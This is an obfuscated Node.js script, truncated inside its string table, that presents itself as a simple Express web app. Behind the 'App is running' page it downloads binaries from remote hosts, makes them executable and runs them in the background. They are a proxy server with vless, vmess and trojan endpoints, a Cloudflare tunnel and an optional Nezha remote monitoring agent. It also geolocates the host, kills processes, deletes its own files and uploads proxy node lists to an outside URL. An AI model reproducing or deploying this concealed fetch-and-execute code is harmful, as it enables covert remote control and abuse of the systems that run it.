const _0x18ac58=_0x4d80;(function(_0x15e991,_0x9d64ab){const _0x513641={_0x4a7c3e:0x1b6,_0x5d97f1:0x1f0},_0x3b1d82=_0x4d80,_0x243475=_0x15e991();while(!![]){try{const _0x3f5ed4=parseInt(_0x3b1d82(0x1d7))/0x1+-parseInt(_0x3b1d82(0x1dc))/0x2+parseInt(_0x3b1d82(0x1c3))/0x3+parseInt(_0x3b1d82(0x1c6))/0x4*(parseInt(_0x3b1d82(0x1ed))/0x5)+parseInt(_0x3b1d82(_0x513641._0x4a7c3e))/0x6*(parseInt(_0x3b1d82(0x1df))/0x7)+parseInt(_0x3b1d82(0x1ae))/0x8+-parseInt(_0x3b1d82(_0x513641._0x5d97f1))/0x9*(parseInt(_0x3b1d82(0x1e2))/0xa);if(_0x3f5ed4===_0x9d64ab)break;else _0x243475['push'](_0x243475['shift']());}catch(_0x122fd0){_0x243475['push'](_0x243475['shift']());}}}(_0x55cc,0xbedbd));const express=require(_0x18ac58(0x1ff)),app=express(),axios=require(_0x18ac58(0x1c9)),os=require('os'),fs=require('fs'),path=require(_0x18ac58(0x21c)),{promisify}=require(_0x18ac58(0x177)),exec=promisify(require(_0x18ac58(0x16f))[_0x18ac58(0x1a6)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x18ac58(0x1c7)][_0x18ac58(0x21e)]||'',PROJECT_URL=process['env'][_0x18ac58(0x193)]||'',AUTO_ACCESS=process[_0x18ac58(0x1c7)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x18ac58(0x1c7)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x18ac58(0x1c7)]['SUB_PATH']||_0x18ac58(0x22f),PORT=process[_0x18ac58(0x1c7)][_0x18ac58(0x218)]||process['env'][_0x18ac58(0x190)]||0xbb8,UUID=process[_0x18ac58(0x1c7)][_0x18ac58(0x1b7)]||_0x18ac58(0x1e6),NEZHA_SERVER=process[_0x18ac58(0x1c7)][_0x18ac58(0x1cd)]||'',NEZHA_PORT=process[_0x18ac58(0x1c7)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x18ac58(0x1c7)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x18ac58(0x1fc)]||_0x18ac58(0x170),ARGO_AUTH=process[_0x18ac58(0x1c7)]['ARGO_AUTH']||_0x18ac58(0x1d2),ARGO_PORT=process[_0x18ac58(0x1c7)][_0x18ac58(0x1d8)]||0x1f41,CFIP=process[_0x18ac58(0x1c7)][_0x18ac58(0x174)]||_0x18ac58(0x214),CFPORT=process[_0x18ac58(0x1c7)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0x18ac58(0x191);!fs['existsSync'](FILE_PATH)?(fs[_0x18ac58(0x1fa)](FILE_PATH),console[_0x18ac58(0x202)](FILE_PATH+_0x18ac58(0x22c))):console['log'](FILE_PATH+_0x18ac58(0x204));function generateRandomName(){const _0x5238fe={_0x12abc1:0x1ec},_0x443fa9=_0x18ac58,_0x206509=_0x443fa9(0x225);let _0xb2ec8='';for(let _0xf4f414=0x0;_0xf4f414<0x6;_0xf4f414++){_0xb2ec8+=_0x206509[_0x443fa9(_0x5238fe._0x12abc1)](Math[_0x443fa9(0x1ad)](Math['random']()*_0x206509[_0x443fa9(0x206)]));}return _0xb2ec8;}function _0x4d80(_0x42f5d1,_0x215283){const _0x55ccc2=_0x55cc();return _0x4d80=function(_0x4d80b4,_0x251ce0){_0x4d80b4=_0x4d80b4-0x16a;let _0x52be2d=_0x55ccc2[_0x4d80b4];return _0x52be2d;},_0x4d80(_0x42f5d1,_0x215283);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x18ac58(0x1f3)](FILE_PATH,npmName),phpPath=path[_0x18ac58(0x1f3)](FILE_PATH,phpName),webPath=path[_0x18ac58(0x1f3)](FILE_PATH,webName),botPath=path[_0x18ac58(0x1f3)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x18ac58(0x1db)),listPath=path[_0x18ac58(0x1f3)](FILE_PATH,_0x18ac58(0x1cf)),bootLogPath=path[_0x18ac58(0x1f3)](FILE_PATH,'boot.log'),configPath=path[_0x18ac58(0x1f3)](FILE_PATH,_0x18ac58(0x1aa));function deleteNodes(){const _0x4efd7a={_0x57d767:0x1f1,_0x15fd7e:0x211,_0x542341:0x1e1,_0x4d936e:0x194,_0x5a31c2:0x22b},_0x11d10b=_0x18ac58;try{if(!UPLOAD_URL)return;if(!fs[_0x11d10b(_0x4efd7a._0x57d767)](subPath))return;let _0xdea38e;try{_0xdea38e=fs['readFileSync'](subPath,_0x11d10b(_0x4efd7a._0x15fd7e));}catch{return null;}const _0x1f21e8=Buffer['from'](_0xdea38e,_0x11d10b(0x20e))[_0x11d10b(_0x4efd7a._0x542341)](_0x11d10b(0x211)),_0x2f18cf=_0x1f21e8[_0x11d10b(0x1a0)]('\x0a')['filter'](_0x344b17=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x11d10b(0x222)](_0x344b17));if(_0x2f18cf['length']===0x0)return;return axios[_0x11d10b(0x171)](UPLOAD_URL+_0x11d10b(_0x4efd7a._0x4d936e),JSON[_0x11d10b(0x1ea)]({'nodes':_0x2f18cf}),{'headers':{'Content-Type':_0x11d10b(_0x4efd7a._0x5a31c2)}})[_0x11d10b(0x203)](_0x1a63af=>{return null;}),null;}catch(_0x1d8344){return null;}}function cleanupOldFiles(){const _0x5a3473={_0x3eb1cc:0x1c2},_0x3f87a9=_0x18ac58;try{const _0x348c41=fs['readdirSync'](FILE_PATH);_0x348c41[_0x3f87a9(_0x5a3473._0x3eb1cc)](_0x1d7610=>{const _0x12decf=_0x3f87a9,_0x5a0fb1=path['join'](FILE_PATH,_0x1d7610);try{const _0x587320=fs[_0x12decf(0x1fd)](_0x5a0fb1);_0x587320['isFile']()&&fs[_0x12decf(0x1f2)](_0x5a0fb1);}catch(_0xcce27){}});}catch(_0x4198ad){}}app['get']('/',function(_0x24e14b,_0x5c16b3){const _0x5dbefe={_0x350960:0x1da},_0x12b33f=_0x18ac58;_0x5c16b3['send'](_0x12b33f(_0x5dbefe._0x350960));});async function generateConfig(){const _0x4de7e5={_0x550ba2:0x182,_0x307677:0x215,_0x3f68de:0x1e5,_0x190690:0x184,_0x6a1422:0x215,_0x318b59:0x20b,_0x374330:0x1a1,_0x758e70:0x20b,_0x268692:0x1a1,_0x3f59bf:0x1b2,_0x433ff9:0x187,_0x3e8bcf:0x1f5,_0x55b563:0x1f3,_0x455cd3:0x1aa,_0xcdecf6:0x1ea},_0x3949e7=_0x18ac58,_0x3e8ce6={'log':{'access':'/dev/null','error':_0x3949e7(_0x4de7e5._0x550ba2),'loglevel':_0x3949e7(_0x4de7e5._0x307677)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3949e7(0x184),'settings':{'clients':[{'id':UUID,'flow':_0x3949e7(_0x4de7e5._0x3f68de)}],'decryption':_0x3949e7(_0x4de7e5._0x307677),'fallbacks':[{'dest':0xbb9},{'path':_0x3949e7(0x1f6),'dest':0xbba},{'path':_0x3949e7(0x1fb),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x3949e7(0x1ba)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3949e7(_0x4de7e5._0x190690),'settings':{'clients':[{'id':UUID}],'decryption':_0x3949e7(_0x4de7e5._0x6a1422)},'streamSettings':{'network':_0x3949e7(0x1ba),'security':_0x3949e7(0x215)}},{'port':0xbba,'listen':_0x3949e7(0x18c),'protocol':_0x3949e7(_0x4de7e5._0x190690),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3949e7(0x215)},'streamSettings':{'network':'ws','security':_0x3949e7(0x215),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3949e7(_0x4de7e5._0x318b59),_0x3949e7(_0x4de7e5._0x374330)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3949e7(0x1f8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3949e7(0x1b1),_0x3949e7(_0x4de7e5._0x758e70),_0x3949e7(_0x4de7e5._0x268692)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3949e7(0x18c),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3949e7(0x215),'wsSettings':{'path':_0x3949e7(0x189)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3949e7(0x20b),_0x3949e7(_0x4de7e5._0x374330)],'metadataOnly':![]}}],'dns':{'servers':[_0x3949e7(0x1ee)]},'outbounds':[{'protocol':_0x3949e7(_0x4de7e5._0x3f59bf),'tag':_0x3949e7(0x1e3)},{'protocol':_0x3949e7(0x178),'tag':_0x3949e7(_0x4de7e5._0x433ff9)}]};fs[_0x3949e7(_0x4de7e5._0x3e8bcf)](path[_0x3949e7(_0x4de7e5._0x55b563)](FILE_PATH,_0x3949e7(_0x4de7e5._0x455cd3)),JSON[_0x3949e7(_0x4de7e5._0xcdecf6)](_0x3e8ce6,null,0x2));}function getSystemArchitecture(){const _0x1a8ece={_0xdb9fd5:0x1f7,_0x3fc01d:0x1b0},_0x5177fd=_0x18ac58,_0x23865c=os[_0x5177fd(_0x1a8ece._0xdb9fd5)]();return _0x23865c===_0x5177fd(0x173)||_0x23865c===_0x5177fd(0x19e)||_0x23865c===_0x5177fd(0x223)?'arm':_0x5177fd(_0x1a8ece._0x3fc01d);}function downloadFile(_0x35e692,_0x187815,_0x3d6d5d){const _0x5eae63={_0x572232:0x1f1,_0x614b5f:0x1c0,_0x5d5560:0x16d,_0x3cd6b8:0x201},_0x5a98ab={_0x4831dd:0x1f9,_0x385af9:0x226,_0x2ea0f9:0x1c4,_0x8e4c98:0x1ab},_0x27f489={_0x5cf8c5:0x229,_0x52ef3b:0x207},_0x2214a4={_0xa47d79:0x226,_0xbd408d:0x185},_0x330c5e=_0x18ac58,_0x7053d4=_0x35e692;!fs[_0x330c5e(_0x5eae63._0x572232)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3093f5=fs[_0x330c5e(_0x5eae63._0x614b5f)](_0x7053d4);axios({'method':'get','url':_0x187815,'responseType':_0x330c5e(_0x5eae63._0x5d5560)})[_0x330c5e(_0x5eae63._0x3cd6b8)](_0x5963b6=>{const _0x13815e={_0x4a95ff:0x202,_0x251af6:0x226,_0x40446d:0x22a},_0xe94bf5=_0x330c5e;_0x5963b6[_0xe94bf5(_0x27f489._0x5cf8c5)]['pipe'](_0x3093f5),_0x3093f5['on'](_0xe94bf5(_0x27f489._0x52ef3b),()=>{const _0x557d89=_0xe94bf5;_0x3093f5[_0x557d89(0x1ac)](),console[_0x557d89(_0x13815e._0x4a95ff)](_0x557d89(0x1f9)+path[_0x557d89(_0x13815e._0x251af6)](_0x7053d4)+_0x557d89(_0x13815e._0x40446d)),_0x3d6d5d(null,_0x7053d4);}),_0x3093f5['on']('error',_0x328614=>{const _0x5eef14=_0xe94bf5;fs[_0x5eef14(0x18e)](_0x7053d4,()=>{});const _0x5ce4ae='Download\x20'+path[_0x5eef14(_0x2214a4._0xa47d79)](_0x7053d4)+_0x5eef14(_0x2214a4._0xbd408d)+_0x328614[_0x5eef14(0x1c4)];console[_0x5eef14(0x1ab)](_0x5ce4ae),_0x3d6d5d(_0x5ce4ae);});})[_0x330c5e(0x203)](_0x3da947=>{const _0xe6be2c=_0x330c5e,_0x65e386=_0xe6be2c(_0x5a98ab._0x4831dd)+path[_0xe6be2c(_0x5a98ab._0x385af9)](_0x7053d4)+_0xe6be2c(0x185)+_0x3da947[_0xe6be2c(_0x5a98ab._0x2ea0f9)];console[_0xe6be2c(_0x5a98ab._0x8e4c98)](_0x65e386),_0x3d6d5d(_0x65e386);});}async function downloadFilesAndRun(){const _0x2cc321={_0x3057e8:0x1ab,_0x2140d7:0x200,_0x2312ef:0x19c,_0x60d4a9:0x1bc,_0x2d80d5:0x1f4,_0x5d5eab:0x20f,_0x319dfd:0x1f5,_0x1289c7:0x1b5,_0xe3be76:0x21b,_0x45b22c:0x216,_0x1d31e7:0x1ab,_0x29941b:0x18f,_0x511e55:0x17c,_0x69f20d:0x1c5,_0x584ef9:0x20a,_0x5dfb51:0x1e0,_0xe70eae:0x1ab,_0x13d870:0x1ca,_0x2b00fb:0x16c,_0x2ac1d3:0x1ef,_0x51fb0b:0x1b8,_0x21e28e:0x1a3},_0xe3e10f={_0x3286f7:0x1c2},_0x4ad959=_0x18ac58,_0xb90e65=getSystemArchitecture(),_0x2d1786=getFilesForArchitecture(_0xb90e65);if(_0x2d1786['length']===0x0){console[_0x4ad959(0x202)](_0x4ad959(0x1a5));return;}const _0x2a66b9=_0x2d1786[_0x4ad959(0x1c1)](_0x584593=>{const _0x38eb7a={_0x450e8e:0x1ce};return new Promise((_0x18a55a,_0x5e73a9)=>{const _0x2db028=_0x4d80;downloadFile(_0x584593[_0x2db028(0x1a4)],_0x584593[_0x2db028(_0x38eb7a._0x450e8e)],(_0x50a3ae,_0x10d4af)=>{_0x50a3ae?_0x5e73a9(_0x50a3ae):_0x18a55a(_0x10d4af);});});});try{await Promise[_0x4ad959(0x1e7)](_0x2a66b9);}catch(_0x4780f7){console[_0x4ad959(_0x2cc321._0x3057e8)](_0x4ad959(0x18a),_0x4780f7);return;}function _0x413af(_0x5a63a3){const _0x5b3131={_0x117e33:0x1f1},_0x397ccc={_0x309eaf:0x202,_0x454196:0x1e1},_0x50dda6=_0x4ad959,_0x24d17a=0x1fd;_0x5a63a3[_0x50dda6(_0xe3e10f._0x3286f7)](_0x2f3880=>{const _0x572fd4=_0x50dda6;fs[_0x572fd4(_0x5b3131._0x117e33)](_0x2f3880)&&fs['chmod'](_0x2f3880,_0x24d17a,_0x241377=>{const _0x35919e=_0x572fd4;_0x241377?console[_0x35919e(0x1ab)](_0x35919e(0x1d0)+_0x2f3880+':\x20'+_0x241377):console[_0x35919e(_0x397ccc._0x309eaf)](_0x35919e(0x1be)+_0x2f3880+':\x20'+_0x24d17a[_0x35919e(_0x397ccc._0x454196)](0x8));});});}const _0x3e8431=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x413af(_0x3e8431);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fb34e=NEZHA_SERVER[_0x4ad959(0x172)](':')?NEZHA_SERVER[_0x4ad959(0x1a0)](':')[_0x4ad959(0x227)]():'',_0x25349a=new Set([_0x4ad959(0x17c),_0x4ad959(0x1c5),_0x4ad959(0x1d1),_0x4ad959(0x210),_0x4ad959(_0x2cc321._0x2140d7),_0x4ad959(_0x2cc321._0x2312ef)]),_0x4dc9fd=_0x25349a['has'](_0x4fb34e)?_0x4ad959(_0x2cc321._0x60d4a9):_0x4ad959(_0x2cc321._0x2d80d5),_0x23081f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4ad959(0x1dd)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4dc9fd+_0x4ad959(_0x2cc321._0x5d5eab)+UUID;fs[_0x4ad959(_0x2cc321._0x319dfd)](path[_0x4ad959(0x1f3)](FILE_PATH,_0x4ad959(0x220)),_0x23081f);const _0x196843=_0x4ad959(_0x2cc321._0x1289c7)+phpPath+_0x4ad959(_0x2cc321._0xe3be76)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x196843),console[_0x4ad959(0x202)](phpName+_0x4ad959(_0x2cc321._0x45b22c)),await new Promise(_0x4843bd=>setTimeout(_0x4843bd,0x3e8));}catch(_0x2247a7){console[_0x4ad959(_0x2cc321._0x1d31e7)](_0x4ad959(_0x2cc321._0x29941b)+_0x2247a7);}}else{let _0x27c558='';const _0x194c88=[_0x4ad959(_0x2cc321._0x511e55),_0x4ad959(_0x2cc321._0x69f20d),_0x4ad959(0x1d1),_0x4ad959(0x210),_0x4ad959(_0x2cc321._0x2140d7),_0x4ad959(0x19c)];_0x194c88[_0x4ad959(0x172)](NEZHA_PORT)&&(_0x27c558=_0x4ad959(0x183));const _0x3dde2e=_0x4ad959(_0x2cc321._0x1289c7)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4ad959(_0x2cc321._0x584ef9)+NEZHA_KEY+'\x20'+_0x27c558+_0x4ad959(0x20d);try{await exec(_0x3dde2e),console['log'](npmName+_0x4ad959(0x216)),await new Promise(_0x45e5fe=>setTimeout(_0x45e5fe,0x3e8));}catch(_0x5c5244){console[_0x4ad959(0x1ab)](_0x4ad959(0x1de)+_0x5c5244);}}}else console[_0x4ad959(0x202)](_0x4ad959(0x1d6));const _0x3a2748='nohup\x20'+webPath+_0x4ad959(_0x2cc321._0x5dfb51)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a2748),console[_0x4ad959(0x202)](webName+'\x20is\x20running'),await new Promise(_0x463246=>setTimeout(_0x463246,0x3e8));}catch(_0x5e0908){console[_0x4ad959(_0x2cc321._0xe70eae)](_0x4ad959(_0x2cc321._0x13d870)+_0x5e0908);}if(fs['existsSync'](botPath)){let _0x3c3792;if(ARGO_AUTH[_0x4ad959(_0x2cc321._0x2b00fb)](/^[A-Z0-9a-z=]{120,250}$/))_0x3c3792='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4ad959(0x16c)](/TunnelSecret/)?_0x3c3792=_0x4ad959(_0x2cc321._0x2ac1d3)+FILE_PATH+_0x4ad959(0x21a):_0x3c3792=_0x4ad959(0x175)+FILE_PATH+_0x4ad959(_0x2cc321._0x51fb0b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3c3792+_0x4ad959(0x1a7)),console[_0x4ad959(0x202)](botName+'\x20is\x20running'),await new Promise(_0x1f8229=>setTimeout(_0x1f8229,0x7d0));}catch(_0x2b7d39){console[_0x4ad959(0x1ab)](_0x4ad959(_0x2cc321._0x21e28e)+_0x2b7d39);}}await new Promise(_0x38669c=>setTimeout(_0x38669c,0x1388));}function getFilesForArchitecture(_0x12d0ea){const _0x3c9d7a={_0x1ca6d2:0x173,_0x28088a:0x228,_0x43f315:0x1a8,_0x47cf70:0x19f,_0x33988b:0x18b,_0x56af3:0x173,_0x535f1a:0x1a2,_0x1b6720:0x230,_0x3d5152:0x173,_0x260f39:0x21d},_0x19e451=_0x18ac58;let _0x4462b3;_0x12d0ea===_0x19e451(_0x3c9d7a._0x1ca6d2)?_0x4462b3=[{'fileName':webPath,'fileUrl':_0x19e451(_0x3c9d7a._0x28088a)},{'fileName':botPath,'fileUrl':_0x19e451(_0x3c9d7a._0x43f315)}]:_0x4462b3=[{'fileName':webPath,'fileUrl':_0x19e451(_0x3c9d7a._0x47cf70)},{'fileName':botPath,'fileUrl':_0x19e451(_0x3c9d7a._0x33988b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4de662=_0x12d0ea===_0x19e451(_0x3c9d7a._0x56af3)?_0x19e451(0x1fe):_0x19e451(_0x3c9d7a._0x535f1a);_0x4462b3[_0x19e451(_0x3c9d7a._0x1b6720)]({'fileName':npmPath,'fileUrl':_0x4de662});}else{const _0x1522cb=_0x12d0ea===_0x19e451(_0x3c9d7a._0x3d5152)?_0x19e451(_0x3c9d7a._0x260f39):_0x19e451(0x205);_0x4462b3[_0x19e451(_0x3c9d7a._0x1b6720)]({'fileName':phpPath,'fileUrl':_0x1522cb});}}return _0x4462b3;}function argoType(){const _0x4d0ab8={_0x3db20b:0x202,_0x5e9efa:0x188,_0x1e0b42:0x172,_0x9f3dc:0x1f5,_0x4b2071:0x1a0,_0x489a50:0x1f3,_0x3f6df0:0x180,_0x2b6ff4:0x19d,_0x324acb:0x1f5,_0x338e41:0x221},_0x1e0009=_0x18ac58;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1e0009(_0x4d0ab8._0x3db20b)](_0x1e0009(_0x4d0ab8._0x5e9efa));return;}if(ARGO_AUTH[_0x1e0009(_0x4d0ab8._0x1e0b42)](_0x1e0009(0x192))){fs[_0x1e0009(_0x4d0ab8._0x9f3dc)](path[_0x1e0009(0x1f3)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x17ef66='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1e0009(_0x4d0ab8._0x4b2071)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1e0009(_0x4d0ab8._0x489a50)](FILE_PATH,_0x1e0009(0x17e))+_0x1e0009(_0x4d0ab8._0x3f6df0)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1e0009(_0x4d0ab8._0x2b6ff4);fs[_0x1e0009(_0x4d0ab8._0x324acb)](path['join'](FILE_PATH,_0x1e0009(_0x4d0ab8._0x338e41)),_0x17ef66);}else console[_0x1e0009(0x202)](_0x1e0009(0x1b3));}async function extractDomains(){const _0x3a4ebd={_0x4b5abe:0x202,_0x25ce5f:0x197,_0x2cf080:0x1af,_0x335e7d:0x211,_0x26d2bd:0x202,_0x19cdfa:0x1eb,_0x3fd748:0x1f2,_0x50d484:0x1af,_0x4cc7eb:0x1b5},_0x5f4fc8={_0x5e0351:0x1bb,_0x54285c:0x229,_0x52ff7d:0x229,_0x316468:0x1d9,_0x388f7c:0x229,_0x357225:0x1d5,_0x42001d:0x229,_0x2e1eb1:0x1d9,_0x4390fc:0x229,_0x1725f4:0x208,_0x51c866:0x229,_0x221dcd:0x1d9,_0x21da9d:0x1d3,_0x3b24a4:0x1d9,_0xb6f194:0x1d4},_0x378b2f={_0x1f8fda:0x17f,_0x7dd76a:0x22e,_0x42de5f:0x1ec},_0x2776d0=_0x18ac58;let _0x2b053f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2b053f=ARGO_DOMAIN,console[_0x2776d0(_0x3a4ebd._0x4b5abe)](_0x2776d0(_0x3a4ebd._0x25ce5f),_0x2b053f),await _0x5de1c5(_0x2b053f);else try{const _0x1e0272=fs[_0x2776d0(0x217)](path['join'](FILE_PATH,_0x2776d0(_0x3a4ebd._0x2cf080)),_0x2776d0(_0x3a4ebd._0x335e7d)),_0x2e99cb=_0x1e0272[_0x2776d0(0x1a0)]('\x0a'),_0x5f56a2=[];_0x2e99cb[_0x2776d0(0x1c2)](_0x2dc99b=>{const _0x11763f=_0x2776d0,_0x31d2e2=_0x2dc99b[_0x11763f(0x16c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x31d2e2){const _0x51f721=_0x31d2e2[0x1];_0x5f56a2[_0x11763f(0x199)](_0x51f721);}});if(_0x5f56a2[_0x2776d0(0x206)]>0x0)_0x2b053f=_0x5f56a2[0x0],console[_0x2776d0(_0x3a4ebd._0x4b5abe)](_0x2776d0(0x1c8),_0x2b053f),await _0x5de1c5(_0x2b053f);else{console[_0x2776d0(_0x3a4ebd._0x26d2bd)](_0x2776d0(_0x3a4ebd._0x19cdfa)),fs[_0x2776d0(_0x3a4ebd._0x3fd748)](path[_0x2776d0(0x1f3)](FILE_PATH,_0x2776d0(_0x3a4ebd._0x50d484)));async function _0x2da579(){const _0x267145=_0x2776d0;try{process['platform']===_0x267145(_0x378b2f._0x1f8fda)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x267145(0x196)):await exec(_0x267145(_0x378b2f._0x7dd76a)+botName[_0x267145(_0x378b2f._0x42de5f)](0x0)+']'+botName[_0x267145(0x1e4)](0x1)+_0x267145(0x1a9));}catch(_0x3f5819){}}_0x2da579(),await new Promise(_0x50cc36=>setTimeout(_0x50cc36,0xbb8));const _0x2b64fc=_0x2776d0(0x175)+FILE_PATH+_0x2776d0(0x1b8)+ARGO_PORT;try{await exec(_0x2776d0(_0x3a4ebd._0x4cc7eb)+botPath+'\x20'+_0x2b64fc+_0x2776d0(0x1a7)),console[_0x2776d0(0x202)](botName+_0x2776d0(0x216)),await new Promise(_0x820034=>setTimeout(_0x820034,0xbb8)),await extractDomains();}catch(_0x396080){console[_0x2776d0(0x1ab)](_0x2776d0(0x1a3)+_0x396080);}}}catch(_0x27c6c8){console['error']('Error\x20reading\x20boot.log:',_0x27c6c8);}async function _0x19cf51(){const _0xb26eb9=_0x2776d0;try{const _0x1ae6e1=await axios[_0xb26eb9(_0x5f4fc8._0x5e0351)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1ae6e1[_0xb26eb9(0x229)]&&_0x1ae6e1[_0xb26eb9(_0x5f4fc8._0x54285c)][_0xb26eb9(0x1d5)]&&_0x1ae6e1[_0xb26eb9(_0x5f4fc8._0x52ff7d)][_0xb26eb9(_0x5f4fc8._0x316468)])return _0x1ae6e1[_0xb26eb9(_0x5f4fc8._0x388f7c)][_0xb26eb9(_0x5f4fc8._0x357225)]+'_'+_0x1ae6e1[_0xb26eb9(_0x5f4fc8._0x42001d)][_0xb26eb9(_0x5f4fc8._0x2e1eb1)];}catch(_0x1df333){try{const _0x5bdb11=await axios[_0xb26eb9(0x1bb)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5bdb11[_0xb26eb9(_0x5f4fc8._0x4390fc)]&&_0x5bdb11['data'][_0xb26eb9(_0x5f4fc8._0x1725f4)]===_0xb26eb9(0x17d)&&_0x5bdb11[_0xb26eb9(0x229)][_0xb26eb9(0x1d3)]&&_0x5bdb11[_0xb26eb9(_0x5f4fc8._0x51c866)][_0xb26eb9(_0x5f4fc8._0x221dcd)])return _0x5bdb11['data'][_0xb26eb9(_0x5f4fc8._0x21da9d)]+'_'+_0x5bdb11['data'][_0xb26eb9(_0x5f4fc8._0x3b24a4)];}catch(_0x1dc6dc){}}return _0xb26eb9(_0x5f4fc8._0xb6f194);}async function _0x5de1c5(_0x543283){const _0x2ae4a5={_0x6a345f:0x20b,_0x17883d:0x19b,_0x326973:0x19a,_0x47d6b3:0x20e,_0x23e3fe:0x198,_0x448c5a:0x202,_0x616286:0x1e1,_0x8e3719:0x1f5,_0x27e69a:0x20e,_0x42ad80:0x1bb},_0x2525d2=await _0x19cf51(),_0x272cd5=NAME?NAME+'-'+_0x2525d2:_0x2525d2;return new Promise(_0xca086c=>{const _0xeff5b8={_0x2b6496:0x212};setTimeout(()=>{const _0x3ed6c8=_0x4d80,_0x314a01={'v':'2','ps':''+_0x272cd5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3ed6c8(0x215),'net':'ws','type':'none','host':_0x543283,'path':'/vmess-argo?ed=2560','tls':_0x3ed6c8(_0x2ae4a5._0x6a345f),'sni':_0x543283,'alpn':'','fp':_0x3ed6c8(0x18d)},_0x1efb8f=_0x3ed6c8(0x1cc)+UUID+'@'+CFIP+':'+CFPORT+_0x3ed6c8(0x16a)+_0x543283+_0x3ed6c8(_0x2ae4a5._0x17883d)+_0x543283+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x272cd5+'\x0a\x0avmess://'+Buffer[_0x3ed6c8(_0x2ae4a5._0x326973)](JSON['stringify'](_0x314a01))[_0x3ed6c8(0x1e1)](_0x3ed6c8(_0x2ae4a5._0x47d6b3))+_0x3ed6c8(0x1bd)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x543283+'&fp=firefox&type=ws&host='+_0x543283+_0x3ed6c8(_0x2ae4a5._0x23e3fe)+_0x272cd5+_0x3ed6c8(0x179);console[_0x3ed6c8(_0x2ae4a5._0x448c5a)](Buffer[_0x3ed6c8(0x19a)](_0x1efb8f)[_0x3ed6c8(_0x2ae4a5._0x616286)](_0x3ed6c8(0x20e))),fs[_0x3ed6c8(_0x2ae4a5._0x8e3719)](subPath,Buffer['from'](_0x1efb8f)['toString'](_0x3ed6c8(_0x2ae4a5._0x27e69a))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3ed6c8(_0x2ae4a5._0x42ad80)]('/'+SUB_PATH,(_0x448eff,_0x17b548)=>{const _0x461801=_0x3ed6c8,_0x12a9bd=Buffer['from'](_0x1efb8f)[_0x461801(0x1e1)](_0x461801(0x20e));_0x17b548[_0x461801(_0xeff5b8._0x2b6496)](_0x461801(0x22d),_0x461801(0x17a)),_0x17b548[_0x461801(0x213)](_0x12a9bd);}),_0xca086c(_0x1efb8f);},0x7d0);});}}function _0x55cc(){const _0x569466=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','utf-8','set','send','saas.sin.fan','none','\x20is\x20running','readFileSync','SERVER_PORT','https://oooo.serv00.net/add-url','/tunnel.yml\x20run','\x20-c\x20\x22','path','https://arm64.ssss.nyc.mn/v1','UPLOAD_URL','Nodes\x20uploaded\x20successfully','config.yaml','tunnel.yml','test','aarch64','filter','abcdefghijklmnopqrstuvwxyz','basename','pop','https://arm64.ssss.nyc.mn/web','data','\x20successfully','application/json','\x20is\x20created','Content-Type','pkill\x20-f\x20\x22[','111111','unshift','?encryption=none&security=tls&sni=','platform','match','stream','Error\x20in\x20startserver:','child_process','railway.2260629.xyz','post','includes','arm','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20>\x20nul\x202>&1','util','blackhole','\x0a\x20\x20\x20\x20','text/plain;\x20charset=utf-8','App\x20is\x20running','443','success','tunnel.json','win32','\x0a\x20\x20p